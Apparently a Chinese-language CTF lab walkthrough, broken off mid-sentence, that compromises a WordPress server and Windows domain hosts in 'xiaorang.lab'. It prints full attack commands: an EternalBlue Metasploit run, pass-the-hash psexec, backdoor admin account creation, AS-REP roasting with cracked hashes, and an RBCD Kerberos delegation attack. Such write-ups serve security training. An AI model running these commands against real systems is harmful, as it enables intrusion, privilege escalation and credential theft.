class="hljs-number">302</span> -    <span class="hljs-number">0B</span>  - /wp-admin/  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-login.php?redirect_to=http%3A%2F%2F39.99.132.104%2Fwp-admin%2F&amp;reauth=1</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">319B</span>  - /wp-content  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-content/</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">1B</span>  - /wp-admin/admin-ajax.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">69B</span>  - /wp-content/plugins/akismet/akismet.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">500</span> -    <span class="hljs-number">0B</span>  - /wp-content/plugins/hello.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /wp-content/uploads/<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">777B</span>  - /wp-content/upgrade/<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /wp-includes/rss-functions.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">5</span>KB - /wp-login.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /wp-cron.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0B</span>  - /wp-signup.php  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-login.php?action=register</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">320B</span>  - /wp-includes  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-includes/</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">54</span>KB - /wp-includes/<br>[<span class="hljs-meta">01:14:19</span>] <span class="hljs-number">405</span> -   <span class="hljs-number">42B</span>  - /xmlrpc.php<br></code></pre></td></tr></table></figure><h1 id="WordPress-插件-rce"><a href="#WordPress-插件-rce" class="headerlink" title="WordPress 插件 rce"></a>WordPress 插件 rce</h1><p>wp-admin 能加载，一个 wp 登录框</p><p><img src="https://img.dkdun.cn/v1/2025/12/b7cb68187da89cfa.png"></p><p>admin:123456 登陆进去，有 theme file editor，直接改 php 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/1d2dea1744011397.png"></p><p>连上路径</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">132.104</span><span class="hljs-regexp">/wp-admin/</span>theme-editor.php?file=functions.php<br></code></pre></td></tr></table></figure><p>在根目录拿到 flag01</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag01</span>: flag&#123;<span class="hljs-number">9</span>a8904be-<span class="hljs-number">64</span>af-<span class="hljs-number">4</span>faa-a667-d6ef0bc0ad64&#125;<br></code></pre></td></tr></table></figure><h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><p>传 fscan 扫主机</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[2025-07-19 01:36:07]</span> <span class="hljs-selector-attr">[HOST]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:alive 详情:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:08]</span> <span class="hljs-selector-attr">[HOST]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:alive 详情:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:10]</span> <span class="hljs-selector-attr">[HOST]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:alive 详情:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:10]</span> <span class="hljs-selector-attr">[HOST]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span> 状态:alive 详情:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:10]</span> <span class="hljs-selector-attr">[HOST]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> 状态:alive 详情:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:open 详情:port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:open 详情:port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:open 详情:port=<span class="hljs-number">139</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:open 详情:port=<span class="hljs-number">389</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:open 详情:port=<span class="hljs-number">135</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:open 详情:port=<span class="hljs-number">88</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:open 详情:port=<span class="hljs-number">139</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:open 详情:port=<span class="hljs-number">135</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:open 详情:port=<span class="hljs-number">80</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:open 详情:port=<span class="hljs-number">3306</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:open 详情:port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:open 详情:port=<span class="hljs-number">139</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:open 详情:port=<span class="hljs-number">135</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:open 详情:port=<span class="hljs-number">80</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span> 状态:open 详情:port=<span class="hljs-number">22</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span> 状态:open 详情:port=<span class="hljs-number">80</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> 状态:open 详情:port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> 状态:open 详情:port=<span class="hljs-number">139</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> 状态:open 详情:port=<span class="hljs-number">135</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:identified 详情:hostname=XR-CA, ipv4=<span class="hljs-selector-attr">[172.22.15.18]</span>, ipv6=<span class="hljs-selector-attr">[]</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> 状态:identified 详情:port=<span class="hljs-number">139</span>, domain_name=XIAORANG, workstation_service=XR-<span class="hljs-number">0687</span>, server_service=XR-<span class="hljs-number">0687</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:identified 详情:ipv4=<span class="hljs-selector-attr">[172.22.15.13]</span>, ipv6=<span class="hljs-selector-attr">[]</span>, hostname=XR-DC01<br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[VULN]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:vulnerable 详情:port=<span class="hljs-number">445</span>, vulnerability=MS17-<span class="hljs-number">010</span>, os=Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> 状态:identified 详情:ipv4=<span class="hljs-selector-attr">[172.22.15.35]</span>, ipv6=<span class="hljs-selector-attr">[]</span>, hostname=XR-<span class="hljs-number">0687</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:identified 详情:service=smb, os=Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span>, port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:identified 详情:hostname=XR-WIN08, ipv4=<span class="hljs-selector-attr">[172.22.15.24]</span>, ipv6=<span class="hljs-selector-attr">[]</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span> 状态:identified 详情:Url=http:<span class="hljs-comment">//172.22.15.26, status_code=200, length=39962, server_info=map[content-type:text/html; charset=UTF-8 date:Fri, 18 Jul 2025 17:36:16 GMT length:39962 link:&lt;http://172.22.15.26/index.php/wp-json/&gt;; rel=&quot;https://api.w.org/&quot; server:Apache/2.4.41 (Ubuntu) status_code:200 title:XIAORANG.LAB vary:Accept-Encoding], fingerprints=[], port=80, service=http, title=XIAORANG.LAB</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:identified 详情:workstation_service=XR-CA, server_service=XR-CA, os_version=Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span>, port=<span class="hljs-number">139</span>, computer_name=XR-CA<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span>, domain_name=xiaorang<span class="hljs-selector-class">.lab</span>, netbios_domain=XIAORANG, netbios_computer=XR-CA<br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:identified 详情:length=<span class="hljs-number">703</span>, server_info=map<span class="hljs-selector-attr">[accept-ranges:bytes content-length:703 content-type:text/html date:Fri, 18 Jul 2025 17:36:16 GMT etag:<span class="hljs-string">&quot;87cafbaec95d91:0&quot;</span> last-modified:Sat, 03 Jun 2023 07:26:35 GMT length:703 server:Microsoft-IIS/10.0 status_code:200 title:IIS Windows Server]</span>, fingerprints=<span class="hljs-selector-attr">[]</span>, port=<span class="hljs-number">80</span>, service=http, title=IIS Windows Server, Url=http:<span class="hljs-comment">//172.22.15.18, status_code=200</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:identified 详情:port=<span class="hljs-number">139</span>, computer_name=XR-DC01<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span>, domain_name=xiaorang<span class="hljs-selector-class">.lab</span>, netbios_domain=XIAORANG, server_service=XR-DC01, domain_controllers=XIAORANG, netbios_computer=XR-DC01, workstation_service=XR-DC01, os_version=Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:identified 详情:workstation_service=XR-WIN08, server_service=XR-WIN08, os_version=Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span>, port=<span class="hljs-number">139</span>, computer_name=XR-WIN08, domain_name=XR-WIN08, netbios_domain=XR-WIN08, netbios_computer=XR-WIN08<br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:identified 详情:length=<span class="hljs-number">0</span>, server_info=map<span class="hljs-selector-attr">[content-length:0 content-type:text/html date:Fri, 18 Jul 2025 17:36:16 GMT length:0 location:/www redirect_Url:http://172.22.15.24/www server:Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 status_code:302 title:无标题 x-powered-by:PHP/5.5.9]</span>, fingerprints=<span class="hljs-selector-attr">[]</span>, port=<span class="hljs-number">80</span>, service=http, title=无标题, Url=http:<span class="hljs-comment">//172.22.15.24, status_code=302</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:18]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:identified 详情:status_code=<span class="hljs-number">200</span>, length=<span class="hljs-number">135</span>, server_info=map<span class="hljs-selector-attr">[cache-control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0 content-type:text/html date:Fri, 18 Jul 2025 17:36:17 GMT expires:Thu, 19 Nov 1981 08:52:00 GMT length:135 pragma:no-cache server:Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 set-cookie:rid=vv8286s2m8eiiue19vuvkdbcn4; path=/ status_code:200 title:无标题 x-powered-by:PHP/5.5.9]</span>, fingerprints=<span class="hljs-selector-attr">[]</span>, port=<span class="hljs-number">80</span>, service=http, title=无标题, Url=http:<span class="hljs-comment">//172.22.15.24/www</span><br></code></pre></td></tr></table></figure><p>信息如下：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.15.13</span> XR-DC01 域名xiaorang.lab。<br><span class="hljs-number">172.22.15.18</span> XR-CA同属 xiaorang.lab<br><span class="hljs-number">172.22.15.24</span> <span class="hljs-number">80</span>,<span class="hljs-number">3306</span> XR-WIN08 MS17-<span class="hljs-number">010</span><br><span class="hljs-number">172.22.15.35</span> <span class="hljs-number">445</span>,<span class="hljs-number">139</span> XR-<span class="hljs-number">0687</span><br></code></pre></td></tr></table></figure><p><code>172.22.15.24</code> 存在永恒之蓝漏洞</p><p>老样子传 frpc 和 frpc.ini 流量转发，proxychains 代理一下 msf 打永恒之蓝</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhosts 172.22.15.24<br>run<br></code></pre></td></tr></table></figure><p>不知道为啥执行 shell 会超时，进行 hashdump </p><p><img src="https://img.dkdun.cn/v1/2025/12/5873062a9691ad74.png"> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Administrator</span>:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">0</span>e52d03e9b939997401466a0ec5a9cbc:::<br><span class="hljs-attribute">Guest</span>:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br></code></pre></td></tr></table></figure><p>执行</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-psexec administrator@<span class="hljs-number">172.22.15.24</span> -hashes <span class="hljs-string">&#x27;:0e52d03e9b939997401466a0ec5a9cbc&#x27;</span> -codec gbk<br></code></pre></td></tr></table></figure><p>拿到 system 权限</p><p><img src="https://img.dkdun.cn/v1/2025/12/b4f658f22e455963.png"></p><p>进入 Administrator 用户目录下</p><p><img src="https://img.dkdun.cn/v1/2025/12/e5913f930b310363.png"></p><p>拿到 flag02</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag02: flag&#123;<span class="hljs-number">65518b91</span>-b026-4cfd-a62e-75aea9d458f6&#125;<br></code></pre></td></tr></table></figure><h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><p>扫 172.22.15.24 目录发现有 phpAdmin，但是没有密码，但是发现这台机器桌面上有 phpstudy，可以尝试远程连接，先添加用户密码</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">butt3rf1y</span> qwe456@ /add<br>net localgroup administrators butt3rf1y /add<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/884c3fd0d3eaa369.png"></p><p>远程查看 phpstudy 拿到俩密码</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">root root@<span class="hljs-attr">#123</span><br>zdoo zdo<span class="hljs-meta">o123</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6101b91ad6b199c0.png"></p><p>root 账号登录 phpAdmin，在 zdoo 数据库的 zdoosys_user 中找到很多域用户信息，先保存下来</p><p><img src="https://img.dkdun.cn/v1/2025/12/c71e8ba887d80964.png"></p><h1 id="ZDOO-OA"><a href="#ZDOO-OA" class="headerlink" title="ZDOO OA"></a>ZDOO OA</h1><p>发现 phpstudy 搭建的网站，尝试 zdoo:zdoo123 登录，不行</p><p><img src="https://img.dkdun.cn/v1/2025/12/c843ad6818cb49bd.png"></p><p>admin:123456 成功登录，就有一些用户信息，但是之前在数据库中已经拿到了</p><h1 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h1><p>尝试 AS-REP Roasting 攻击</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-GetNPUsers -dc-ip <span class="hljs-number">172.22.15.13</span>  xiaorang.lab/ -usersfile user.txt<br></code></pre></td></tr></table></figure><p>得到两个 TGT 票据</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$krb5asrep$23$lixiuying<span class="hljs-symbol">@xiaorang</span>.lab<span class="hljs-symbol">@XIAORANG</span>.LAB:beb6333f35e707252e4e869ffed9b20f$75941020628623dc735e3b60ed28131e974c7725788c93d53034211419a12878a24ff34d77fe4f2db6f5364a68c1120cd1958eb758b2e23b1f7d8e117e03ab0503a916da4e7bd75bfb17514266253598c020093b5d17d536caeedbbea4ed8f1b000c168cb75c6e0937ca877aed51334a0c8c36efa487a534fed1e25ef2f5725488da057aa0c4f89cdb2f4341db8297c810a21765394e7426513ca83f98557eaa4230d1d6ecd6f723034340c5d4cc2fc67ea88feb620325c3042b584dd59224b8b6618aa89607c71227d51c1068a85617cd91f549a9f155c594bb96bf824d7755d194042ce253f4cca684574a<br><br>$krb5asrep$23$huachunmei<span class="hljs-symbol">@xiaorang</span>.lab<span class="hljs-symbol">@XIAORANG</span>.LAB:<span class="hljs-number">947</span>a93f5ea00c81d436c808d791742ad$5819df23d5c9779825928b8e7cac411362fe1aca403eb601ea80fcb08b5d8a3fd3ed06201e1bd05abee4c026359b1eac57a69dceed7c5842bd15641f04c312cf2658fc66319b594b9d42a4d5b070e40dfab0d63a04f278f08634f804f285638ea4240954b6b87fad1d7963d2ca462d85b4da4d566847929155bdb9e3dd3c2d97082f962239f6412a2de8643b5e433c0464a896428adcd7e1bbb25230d2065f2e79abcf0b2f0132ca72a2f5fa6d072860098f16f6110fac48732c4d458ea6ab7a219edf8fda033eabcf8e474b790d634183fd5b49ef0ad525034fb1ce643dceb7fce754fdde066e2ca1e4ba70<br></code></pre></td></tr></table></figure><p>用 hashcat 爆破，爆出两个密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/4dbbbd8b908714ac.png"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">lixiuying<span class="hljs-keyword">@xiaorang</span>.<span class="hljs-attribute">lab</span>:winniethepooh<br>huachunmei<span class="hljs-keyword">@xiaorang</span>.<span class="hljs-attribute">lab</span>:<span class="hljs-number">1</span>qaz2wsx<br></code></pre></td></tr></table></figure><p>RDP 继续连接 172.22.15.35</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">proxychains bloodhound-python -u lixiuying -<span class="hljs-selector-tag">p</span> winniethepooh -d xiaorang<span class="hljs-selector-class">.lab</span> -c <span class="hljs-attribute">all</span> -ns <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> <span class="hljs-attr">--zip</span> <span class="hljs-attr">--dns-tcp</span><br></code></pre></td></tr></table></figure><p>导入 bloodhound 查看域关系图</p><p><img src="https://img.dkdun.cn/v1/2025/12/1d9f456723b2fe57.png"></p><p>可以看到 <code>LIXIUYING@XIAORANG.LAB</code> 对 <code>XR-0687.XIAORANG.LAB</code> 有 GenericWrite 的权限，熟悉的 RBCD</p><h1 id="RBDC"><a href="#RBDC" class="headerlink" title="RBDC"></a>RBDC</h1><p>添加机器用户进去</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">proxychains impacket-addcomputer -<span class="hljs-keyword">method</span> <span class="hljs-title function_">SAMR</span> <span class="hljs-title function_">xiaorang</span>.<span class="hljs-title function_">lab</span>/<span class="hljs-title function_">lixiuying</span>:winniethepooh -computer-name butt3rf1y$ -computer-pass <span class="hljs-string">&#x27;u4happy@&#x27;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure><p>修改 <code>XR-0687$</code> 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 字段</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">proxychains -q impacket-rbcd xiaorang.lab/lixiuying:winniethepooh -action write -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">from</span> <span class="hljs-string">&quot;butt3rf1y$&quot;</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">to</span> <span class="hljs-string">&quot;XR-0687$&quot;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/9f7196423c7aede4.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">butt3rf1y</span>$   (S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3745972894</span>-<span class="hljs-number">1678056601</span>-<span class="hljs-number">2622918667</span>-<span class="hljs-number">1147</span>)<br></code></pre></td></tr></table></figure><p>用 impacket 的 getST 执行 RBCD 攻击，获取机器上的 Kerberos 服务票据 TGS</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains -<span class="hljs-selector-tag">q</span> impacket-getST xiaorang.lab/butt3rf1y$:<span class="hljs-string">&#x27;u4happy@&#x27;</span> -spn cifs/XR-<span class="hljs-number">0687</span><span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -impersonate Administrator -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure><p>导入票据</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache<br></code></pre></td></tr></table></figure><p>直接访问目标主机</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> -q impacket-psexec <span class="hljs-string">&#x27;xiaorang.lab/administrator<span class="hljs-variable">@XR</span>-0687.xiaorang.lab&#x27;</span> -target-ip <span class="hljs-number">172.22.15.35</span> -codec gbk -<span class="hljs-literal">no</span>-pass -k<br></code></pre></td></tr></table></figure><p>在 C:\Users\Administrator\flag 下拿到 flag03 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag03</span>: flag&#123;e8893d4e-<span class="hljs-number">1</span>e26-<span class="hljs-number">4</span>e14-a8ff-<span class="hljs-number">5</span>eff3b928f81&#125;<br></code></pre></td></tr></table></figure><h1 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h1><p>最后剩下了拥有 CA 的 172.22.15.18，fscan 扫到一个 Active Directory 证书服务漏洞</p><p><img src="https://img.dkdun.cn/v1/2025/12/88a7693744a44d75.png"></p><p>经过一番搜索发现是 <a href="https://www.freebuf.com/vuls/335471.html">CVE-2022-26923</a> Windows域提权，参考 <a href="https://xz.aliyun.com/news/11073">ADCS攻击笔记</a></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">当 <span class="hljs-variable">Windows</span> 系统的 <span class="hljs-built_in">Active</span> <span 